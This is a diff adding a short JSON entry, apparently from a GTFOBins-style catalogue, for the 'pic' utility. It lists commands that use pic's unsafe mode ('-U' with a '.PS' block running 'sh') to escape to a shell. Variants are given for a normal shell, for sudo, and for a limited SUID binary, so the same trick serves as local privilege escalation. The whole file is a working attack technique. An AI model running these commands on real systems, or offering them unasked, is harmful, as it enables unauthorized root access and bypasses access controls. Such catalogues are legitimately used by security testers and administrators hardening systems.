@@ -1,0 +1,19 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "pic -U\n.PS\nsh X sh X\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo pic -U\n.PS\nsh X sh X\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "./pic -U\n.PS\nsh X sh X\n"
+      }
+    ]
+  }
+}
